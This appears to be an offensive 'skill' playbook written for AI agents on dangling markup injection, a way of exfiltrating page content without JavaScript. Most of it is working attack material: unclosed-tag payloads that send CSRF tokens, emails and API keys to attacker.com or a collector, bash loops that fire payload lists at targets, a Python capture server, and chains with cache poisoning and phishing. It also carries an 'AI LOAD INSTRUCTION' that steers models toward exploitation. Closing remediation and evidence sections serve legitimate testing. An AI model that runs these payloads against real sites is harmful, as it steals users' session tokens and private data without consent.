---
name: dangling-markup-injection
description: >-
  Dangling markup injection playbook. Use when HTML injection is possible but
  JavaScript execution is blocked (CSP, sanitizer strips event handlers, WAF
  blocks script tags) — exfiltrate CSRF tokens, session data, and page content
  by injecting unclosed HTML tags that capture subsequent page content.
---

# SKILL: Dangling Markup Injection — Exfiltration Without JavaScript

> **AI LOAD INSTRUCTION**: Covers dangling markup exfiltration via unclosed img/form/base/meta/link/table tags, what can be stolen (CSRF tokens, pre-filled form values, sensitive content), browser-specific behavior, and combinations with other attacks. Base models often overlook this technique entirely when CSP blocks scripts, jumping to "not exploitable" — dangling markup is the answer.

## 0. RELATED ROUTING

- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) when full XSS is possible (no need for dangling markup)
- [csp-bypass-advanced](../csp-bypass-advanced/SKILL.md) when CSP blocks JS execution — dangling markup bypasses script restrictions
- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) when dangling markup steals CSRF tokens for subsequent CSRF attacks
- [crlf-injection](../crlf-injection/SKILL.md) when CRLF enables HTML injection in HTTP response
- [web-cache-deception](../web-cache-deception/SKILL.md) when dangling markup + cache poisoning amplifies the attack

---

## 1. WHEN TO USE DANGLING MARKUP

You need dangling markup when ALL of these are true:

1. You have an HTML injection point (reflected or stored)
2. JavaScript execution is blocked:
   - CSP blocks inline scripts and event handlers
   - Sanitizer strips `<script>`, `onerror`, `onload`, etc.
   - WAF blocks known XSS patterns
3. The page contains sensitive data AFTER your injection point:
   - CSRF tokens
   - Pre-filled form values (email, username, API keys)
   - Session identifiers in hidden fields
   - Sensitive user content

**Core insight**: You don't need JavaScript to exfiltrate data — you just need the browser to make a request that includes the data in the URL.

---

## 2. CORE TECHNIQUE

Inject an unclosed HTML tag with a `src`, `href`, `action`, or similar attribute pointing to your server. The unclosed attribute quote "consumes" all subsequent page content until the browser finds a matching quote.

```html
Page before injection:
  <div>Hello USER_INPUT</div>
  <form>
    <input type="hidden" name="csrf" value="SECRET_TOKEN_123">
    <input type="text" name="email" value="user@target.com">
  </form>

Injected payload:
  <img src="https://attacker.com/collect?

Resulting HTML:
  <div>Hello <img src="https://attacker.com/collect?</div>
  <form>
    <input type="hidden" name="csrf" value="SECRET_TOKEN_123">
    <input type="text" name="email" value="user@target.com">
  </form>
  ...rest of page until next matching quote (")...
```

The browser interprets everything from `https://attacker.com/collect?` until the next `"` as the URL. The hidden CSRF token and email value become part of the URL query string sent to `attacker.com`.

---

## 3. EXFILTRATION VECTORS

### 3.1 Image Tag (Most Common)

```html
<!-- Double-quote context -->
<img src="https://attacker.com/collect?

<!-- Single-quote context -->
<img src='https://attacker.com/collect?

<!-- Backtick context (IE only, legacy) -->
<img src=`https://attacker.com/collect?
```

The browser sends a GET request to `attacker.com` with all consumed content as query parameters.

**Blocked by**: `img-src` CSP directive

### 3.2 Form Action Hijack

```html
<form action="https://attacker.com/collect">
<button>Click to continue</button>
<!--
```

If the page has form elements after the injection point, the next `</form>` closes the attacker's form. All input fields between become part of the attacker's form → submitted to attacker on user interaction.

**Blocked by**: `form-action` CSP directive

**Trick**: Even without user interaction, if there's an existing submit button or JavaScript auto-submit, the form submits automatically.

### 3.3 Base Tag Hijack

```html
<base href="https://attacker.com/">
```

All subsequent relative URLs on the page resolve to attacker's server:
- `<script src="/js/app.js">` → loads `https://attacker.com/js/app.js`
- `<a href="/profile">` → links to `https://attacker.com/profile`
- `<form action="/submit">` → submits to `https://attacker.com/submit`

**Blocked by**: `base-uri` CSP directive

### 3.4 Meta Refresh Redirect

```html
<meta http-equiv="refresh" content="0;url=https://attacker.com/collect?
```

Redirects the entire page to attacker's server with consumed page content in the URL.

**Blocked by**: `navigate-to` CSP directive (rarely set), some browsers ignore meta refresh when CSP is present.

### 3.5 Link/Stylesheet Exfiltration

```html
<link rel="stylesheet" href="https://attacker.com/collect?
```

Browser requests the URL as a CSS resource, leaking consumed content.

**Blocked by**: `style-src` CSP directive

### 3.6 Table Background (Legacy)

```html
<table background="https://attacker.com/collect?
```

Works in older browsers that support the `background` attribute on table elements.

**Blocked by**: `img-src` CSP directive

### 3.7 Video/Audio Poster

```html
<video poster="https://attacker.com/collect?
<audio src="https://attacker.com/collect?
```

**Blocked by**: `media-src` / `img-src` CSP directives

---

## 4. WHAT CAN BE STOLEN

| Target Data | How It Appears in Page | Steal Technique |
|---|---|---|
| CSRF token | `<input type="hidden" name="csrf" value="...">` | Dangling `<img src=` before the form |
| Pre-filled email | `<input value="user@example.com">` | Dangling tag before the input |
| API keys in page | `var apiKey = "sk-..."` in inline script | Dangling tag before the script block |
| Session ID in hidden field | `<input name="session" value="...">` | Dangling tag before the form |
| Auto-filled passwords | Browser auto-fills password field | `<form action=attacker>` with matching input names |
| OAuth state/tokens | In URL parameters or hidden form fields | Dangling tag on authorization page |
| Internal URLs/paths | Links, script sources, API endpoints | `<base>` tag hijack captures all relative URLs |

---

## 5. BROWSER-SPECIFIC BEHAVIOR

| Browser | Behavior |
|---|---|
| **Chrome/Chromium** | Blocks dangling markup in `<img>` `src` containing `<` or newlines (since Chrome 60). Still allows `<form action>`, `<base>`, `<link>`. |
| **Firefox** | More permissive with dangling markup in image sources. Allows newlines in attribute values. |
| **Safari** | Similar to Chrome's restrictions. May handle some edge cases differently. |
| **Edge (Chromium)** | Same as Chrome behavior. |

### Chrome Mitigation Detail

Chrome blocks navigation/resource load when the URL attribute value contains:
- `<` character (indicates HTML tag consumption)
- Newline characters (`\n`, `\r`)

**Bypass**: Use `<form action>` instead of `<img src>` — Chrome's block only targets specific tags.

---

## 6. ADVANCED TECHNIQUES

### 6.1 Selective Consumption

Choose quote type strategically: if page uses `"` for attributes, inject with `'` (and vice versa) to precisely control where consumption stops.

### 6.2 Textarea + Form Combo

`<form action="https://attacker.com/collect"><textarea name="data">` — unclosed textarea eats all subsequent HTML as plaintext; form submission sends it to attacker.

### 6.3 Comment / Style Dangling

- `<!-- ` without closing `-->` consumes all content (no exfil, but hides page content)
- `<style>` unclosed treats page as CSS; combine with `@import url("https://attacker.com/?` for exfil

### 6.4 Window.name via iframe

`<iframe src="https://target.com/page" name="` — name attribute consumes content, and `window.name` persists across origins after navigation.

---

## 7. LIMITATIONS

| Limitation | Detail |
|---|---|
| Same-origin content only | Dangling markup only captures content from the same HTTP response |
| Quote matching | Consumption stops at the next matching quote character — may not reach target data |
| CSP img-src/form-action | Strict CSP can block most exfiltration vectors |
| Chrome's dangling markup mitigation | Blocks `<img src=` with `<` or newlines in URL |
| Injection point must be before target data | Can only capture content that appears after the injection in HTML source order |
| Content encoding | URL-unsafe characters in captured content may be mangled |

---

## 8. COMBINATION ATTACKS

### 8.1 Dangling Markup + Open Redirect

```
1. Inject <img src="https://target.com/redirect?url=https://attacker.com/collect?
2. Open redirect on target.com makes the request "same-origin" for some CSP checks
3. Redirect sends captured data to attacker
```

### 8.2 Dangling Markup + Cache Poisoning

```
1. Find reflected HTML injection point
2. Inject dangling markup payload
3. If response is cached, ALL users see the dangling markup
4. Tokens/data from all victims exfiltrated
```

This turns a reflected injection into a stored/persistent attack.

### 8.3 Dangling Markup + CSRF

```
1. Use dangling markup to steal CSRF token from page
2. Use stolen token to perform CSRF attack
3. Allows CSRF even when tokens are properly implemented
```

### 8.4 Dangling Markup + Clickjacking

```
1. Inject <form action="https://attacker.com/collect"><textarea name="data">
2. Frame the page (if frame-ancestors allows)
3. Trick user into clicking "Submit" via clickjacking overlay
4. Form submits all captured page content to attacker
```

---

## 9. DANGLING MARKUP DECISION TREE

```
HTML injection exists but XSS is blocked (CSP/sanitizer/WAF)?
│
├── Identify injection context
│   ├── Inside attribute value? → Break out first: "><img src="https://attacker.com/collect?
│   ├── Inside tag content? → Inject directly: <img src="https://attacker.com/collect?
│   └── Inside script block? → Close script first: </script><img src="...
│
├── What sensitive data exists AFTER injection point?
│   ├── CSRF tokens → HIGH VALUE: steal token → CSRF attack
│   ├── User PII (email, name) → data theft
│   ├── API keys / secrets → account compromise
│   ├── No sensitive data after injection → dangling markup not useful here
│   └── Check different pages — injection may be on a page with sensitive data
│
├── Choose exfiltration vector based on CSP
│   ├── No CSP / lax CSP → <img src="...  (simplest)
│   ├── img-src restricted?
│   │   ├── form-action unrestricted? → <form action="attacker"><textarea name=d>
│   │   ├── base-uri unrestricted? → <base href="attacker">
│   │   └── style-src unrestricted? → <link rel=stylesheet href="...
│   ├── Strict CSP on all directives?
│   │   ├── meta refresh? → <meta http-equiv="refresh" content="0;url=attacker?
│   │   ├── DNS prefetch? → <link rel=dns-prefetch href="//data.attacker.com">
│   │   └── Window.name via iframe? → <iframe name="...
│   └── Nothing works? → dangling markup blocked, try other approaches
│
├── Handle Chrome's dangling markup mitigation
│   ├── Target uses Chrome? → Avoid <img src= with < or newlines
│   ├── Use <form action=> instead (not blocked)
│   ├── Use <base href=> (not blocked)
│   └── Test in Firefox as fallback (more permissive)
│
├── Choose quote type for maximum capture
│   ├── Target data uses double quotes? → Inject with single quote: <img src='...
│   ├── Target data uses single quotes? → Inject with double quote: <img src="...
│   └── Mixed quotes? → Test both, see which captures more useful data
│
└── Amplification
    ├── Response cached? → Poison cache → steal from multiple victims
    ├── Stored injection? → Every page view exfiltrates
    └── Reflected only? → Deliver via phishing link
```

---

## 10. TRICK NOTES — WHAT AI MODELS MISS

1. **Dangling markup is THE answer when CSP blocks scripts but HTML injection exists.** Models trained on XSS often conclude "not exploitable" when CSP is strict — dangling markup doesn't need JavaScript.
2. **Chrome's mitigation is tag-specific, not universal**: `<img src=` is mitigated, but `<form action=`, `<base href=`, `<meta http-equiv=refresh>` are NOT. Always try alternative vectors.
3. **Quote type selection is critical**: If the page uses `"` for attributes, inject with `'` (or vice versa) to control exactly where consumption stops. Wrong quote type = capturing useless content or nothing.
4. **Injection point placement matters enormously**: The injection must appear BEFORE the target data in the HTML source. If CSRF token is above your injection point, dangling markup cannot capture it.
5. **`<textarea>` is the most underrated vector**: An unclosed textarea eats ALL subsequent HTML as plaintext. Combined with form action hijack, it's the most reliable method when img-src is restricted.
6. **Window.name persists across origins**: If you can inject an iframe, the `name` attribute technique is powerful because `window.name` survives cross-origin navigation — a rare cross-origin data channel.
7. **DNS prefetch exfiltration works even under strict CSP**: `<link rel=dns-prefetch href="//stolen-data.attacker.com">` triggers a DNS lookup that CSP cannot block. Limited to ~253 characters per label, but sufficient for tokens.

---

## 11. EXECUTION PRIMITIVES

Dangling markup is proven by **receipt of the captured bytes**. These blocks make that receipt
unambiguous and test the technique against the specific blocker in front of you.

### 11.1 Confirm the injection sink and its context first

```bash
P='zz<zz attr="'
curl -sS --get --data-urlencode "q=$P" "https://target.tld/search" -o /tmp/d
python3 - <<'PY'
h=open('/tmp/d',encoding='utf-8',errors='replace').read()
i=h.find('zz<')
print(repr(h[max(0,i-200):i+300]))
PY
```

Dangling markup needs your injected tag to remain **unclosed in the response body** and to be
followed by sensitive content. If the parser closes your tag, or no sensitive content follows, the
technique has nothing to capture - find a sink earlier in the document.

### 11.2 The receiving endpoint: log the raw path and query

```bash
# a minimal collector that records the full request line - the captured data arrives in the URL
python3 - <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
import datetime
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        with open("capture.log","a") as f:
            f.write(f"{datetime.datetime.utcnow().isoformat()} GET {self.path}\n")
            for k,v in self.headers.items(): f.write(f"    {k}: {v}\n")
        self.send_response(200); self.send_header("Content-Type","text/plain"); self.end_headers()
        self.wfile.write(b"ok")
    def log_message(self,*a): pass
HTTPServer(("0.0.0.0",8080), H).serve_forever()
PY
# expose it over TLS with a trusted cert, because many sinks refuse plain http
# (cloudflared tunnel / ngrok / your own cert) - a trusted https URL is required for img-src
```

An `img src` to a plain-HTTP host is blocked on an HTTPS page, so **the collector must be HTTPS with a
valid certificate**. A failed capture is more often a TLS problem than a failed payload.

### 11.3 The core payloads, one per tag

```bash
COLLAB="https://collector.example.tld"
cat > payloads.txt <<EOF
<img src='$COLLAB/leak?x=
<form action='$COLLAB/f'><button>go
<base href='$COLLAB/b?x=
<meta http-equiv=refresh content='0;url=$COLLAB/m?x=
<link rel=prefetch href='$COLLAB/l?x=
<table background='$COLLAB/t?x=
<iframe src='$COLLAB/i?x=
<textarea>
<style>@import '$COLLAB/s?x=
<img src="$COLLAB/leak?x=
EOF
while read -r P; do
  echo "=== $P"
  curl -sS --get --data-urlencode "q=$P" "https://target.tld/search" -o /dev/null
  echo "  sent; now check capture.log for a request whose path contains page content"
done < payloads.txt
```

Each tag captures a **different neighbouring content type**: `<img src=` grabs the rest of an
attribute value; `<form action=` grabs until a quote; `<base href=` rewrites every relative URL;
`<meta refresh>` commits a navigation. Try several - which one works is a property of the page's
markup, not of your skill.

### 11.4 The single-quote and double-quote variants

```bash
for Q in "'" '"'; do
  P="<img src=${Q}$COLLAB/q${Q}>"
  echo "quote=$Q payload=$P"
  curl -sS --get --data-urlencode "q=$P" "https://target.tld/search" -o /tmp/q
  grep -o "img src=[^>]*" /tmp/q | head -2
done
```

If the response wraps your injection in a quoted attribute, the quote character you choose determines
whether the capture continues past your tag. **Attribute context is the deciding factor** - and it is
one byte of information you can read from 11.1.

### 11.5 CSRF-token capture, end to end

```bash
# the classic target: a form on the page carries a token the attacker cannot read (SameSite, no CORS)
curl -sS -b "$SESSION" "https://target.tld/account/settings" -o /tmp/acct
grep -oE 'name="(csrf|_token|authenticity_token)"[^>]*value="[^"]*"' /tmp/acct
# inject an unclosed img placed BEFORE that field so the capture includes the value
P="<img src='$COLLAB/c?x="
curl -sS --get --data-urlencode "q=$P" "https://target.tld/profile" -o /dev/null
sleep 10; grep -o 'c?x=[^ ]*' capture.log | head -3
```

A captured token proves the exfiltration; using it is a separate step and a separate finding. Show
the token arriving at the collector and stop.

### 11.6 Test against each blocker explicitly

```bash
echo "--- CSP: does the policy block img-src to my host?"
curl -sS -D- -o /dev/null "https://target.tld/" | grep -i 'content-security-policy' | \
  tr ';' '\n' | grep -iE 'img-src|default-src|connect-src'
echo "--- sanitizer: is the tag survived, or stripped?"
curl -sS --get --data-urlencode "q=<img src=x onerror=1>" "https://target.tld/" | grep -oiE '<img[^>]*>' | head -3
echo "--- WAF: status and body differ from a benign request?"
curl -sS -o /dev/null -w 'benign=%{http_code}\n' "https://target.tld/?q=hello"
curl -sS -o /dev/null -w 'payload=%{http_code}\n' --get --data-urlencode "q=<img src='https://x'>" "https://target.tld/"
```

Dangling markup is the technique for **when script is blocked**. Confirm which blocker is in play, and
that your tag survives it - a sanitizer that strips `img` entirely means you need a different tag, not
a different technique.

### 11.7 Measure how much content the capture reaches

```bash
# the capture is only useful if it spans the sensitive field
P='<img src="https://COLLAB/m?x='
curl -sS --get --data-urlencode "q=$P" "https://target.tld/search" -o /dev/null
sleep 8
python3 - <<'PY'
import re
for line in open("capture.log"):
    m = re.search(r'GET (/m\?x=.{0,400})', line)
    if m:
        print("captured length:", len(m.group(1)))
        print("captured:", m.group(1)[:400])
PY
```

The captured length tells you whether the tag reached the value you wanted. A capture that stops at
the next quote is short; a capture running hundreds of bytes usually includes a form field - read it
and see what you got.

### 11.8 Build a repeatable proof page

```bash
cat > /tmp/dangling.html <<'HTML'
<!doctype html><meta charset=utf-8>
<h1>victim page with injection</h1>
<!-- the injected, unclosed tag is placed here by the vulnerable sink -->
<img src="https://COLLAB/m?x=
<form method=post action=/account/email>
  <input name=csrf_token value="TOKEN_VALUE_SHOULD_APPEAR_IN_CAPTURE">
  <input name=email>
</form>
HTML
python3 -c "
import re
h=open('/tmp/dangling.html').read()
i=h.find('<img src='); stop=h.find('>',i) if h.find('>',i)>0 else len(h)
print('tag extends to next > at', stop, '- content after it is captured until a quote')"
```

This local page makes the mechanism legible: the browser consumes the tag, and everything until the
next closing delimiter becomes part of the URL it requests. Use it to explain the finding, then prove
it on the real target.

---

## 12. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the collector **receive a request** whose path contains page content, not just your own placeholder? | capture is the finding; the payload string is not |
| 2 | Is the captured content **sensitive** - a token, a prefilled value, a private record? | capturing public text is not an exfiltration finding |
| 3 | Would the victim's session carry the value there (auth, cookies, prefilled fields)? | without victim data there is nothing to steal |
| 4 | Does the injected tag **survive the site's sanitizer** in the real response? | a stripped tag captures nothing |
| 5 | Does the **CSP** permit the channel you used (`img-src`/`connect-src` for that host)? | a blocked channel yields no capture |
| 6 | Did you demonstrate it **without** script execution (the point of the technique)? | if you had script, you would not need dangling markup |
| 7 | How much content did the capture span, and does it include the field you targeted? | the capture length is the evidence of reach |

**Receipt of the captured bytes is the bar.** A payload that injects an unclosed tag but produces no
inbound request is an HTML injection, not a dangling-markup exfiltration - and should be reported as
the former.

---

## 13. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **exact payload** and the **injection point**, with the response showing the unclosed tag | the mechanism, and what the fix owner must reproduce |
| The **collector log line** - timestamp, full request line, source IP | the capture; without it the finding is unproven |
| The **captured content**, quoted, with an explanation of which field it is | connects the capture to the sensitive value |
| The **sensitive value identified** (the CSRF token, the email, the record) | impact |
| The **channel used** (`img-src`, `link prefetch`, `form action`) and that the CSP permits it | a channel the policy blocks would not have captured |
| The **sanitizer behaviour observed** - what survived and what was removed | explains why this tag was chosen |
| A demonstration that the capture occurs **in a victim's session**, or a clear statement of the dependency | the victim's data is the value being stolen |
| **Negative control** - the same payload without a session, or a benign injection, captures nothing sensitive | rules out a page that always leaks its own public content |
| The **browser and version** tested | parsing and `dns-prefetch` behaviour vary |
| A statement that the captured token was **not used** and no account state was changed | the capture is the finding; using it would be a separate action |

Report the **captured bytes**: "the profile page reflects the `q` parameter into an attribute without
escaping; injecting `<img src='https://collector/m?x=` produced an inbound request 4 seconds later
whose path contained 312 bytes of the page, including
`csrf_token` and its value `9f3c...`; the page's CSP allows `img-src https:` so the channel was
permitted, and no script executed at any point", never "dangling markup is possible".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| The unclosed tag appears in the response but the collector receives nothing | no capture; the tag was closed or the channel blocked |
| The capture contains only text you injected yourself | no victim content |
| The captured value is a public, non-sensitive string | nothing was stolen |
| The sanitizer stripped the tag before rendering | the control worked |
| The CSP blocks `img-src`/`connect-src` to your host and nothing arrives | the control worked |
| A capture that occurs only in your own authenticated session with no cross-user path | self-XSS-shaped; no victim |
| The capture spans only your own injected attribute | no neighbouring content reached |
| A technique that requires script execution | that is XSS, and a different finding |
| An injection you can only place by editing the request in a proxy, with no delivery path to a victim | not reachable |
| A captured token you then **used** to change state | that is a separate CSRF finding, and an action you must be authorized to take |
| An `img` on a page that always loads your host for an unrelated reason | correlation, not capture |
| The payload fires only in a browser with a non-default configuration | unverified |

**No callback, no finding.** The inbound request is the entire evidence base of this technique.

---

## 14. REMEDIATION REFERENCE

1. **Contextual output encoding at the sink** - encode `"` `'` `<` `>` `&` for the exact context; dangling markup requires an unclosed tag, and correct attribute encoding removes the precondition entirely.
2. **Sanitise with a maintained HTML sanitiser on the server, not with a regex** - an allowlist that drops `img` without a `src`, `form`, `base`, `meta`, and `link` closes the specific tag families this technique uses.
3. **Set `base-uri 'none'`** - it is the direct control against the `<base href>` variant, and it is one directive.
4. **Restrict `img-src`, `connect-src`, and `form-action` to specific hosts** - the capture needs an outbound channel; a policy that permits only your own origins removes the exfiltration path even when injection succeeds.
5. **Set `form-action 'self'`** - it blocks the `<form action>` variant and form-based exfiltration generally.
6. **Serve session-relevant pages with `SameSite=Strict` cookies and a strict `Referrer-Policy`** - they do not stop the capture, but they reduce what a captured value is worth and cut off some redirect-based variants.
7. **Do not put secrets in page markup** - a CSRF token that is only issued alongside a second bound value, or a per-request token requiring a preceding handshake, limits what a single capture yields.
8. **Bind CSRF tokens to the request and validate them server-side strictly** - a captured token is only useful if it can be replayed; strict validation with short validity reduces the window.
9. **Avoid reflecting unescaped input into attribute contexts at all** - the safest fix for this class is to render user input only in text contexts, never inside a tag's attributes.
10. **Add a regression test that asserts injected markup stays inert** - place a known payload in every reflected field in CI and assert that no unclosed tag survives into the response.
11. **Monitor for outbound requests from your pages to unknown hosts** - a CSP report or a client-side beacon on unexpected `img`/`link` loads is the detection signal for this class.

---

## 15. RELATED SIBLINGS - LOAD TOGETHER

- [xss-exploitation-chains](../xss-exploitation-chains/SKILL.md) - the stronger technique when script is possible
- [csp-bypass-advanced](../csp-bypass-advanced/SKILL.md) - the policy that decides which channel can carry the capture
- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) - what the captured token would be used for
- [clickjacking](../clickjacking/SKILL.md) - the other way to make a victim act without script
- [web-cache-deception](../web-cache-deception/SKILL.md) - a neighbouring client-side exfiltration class
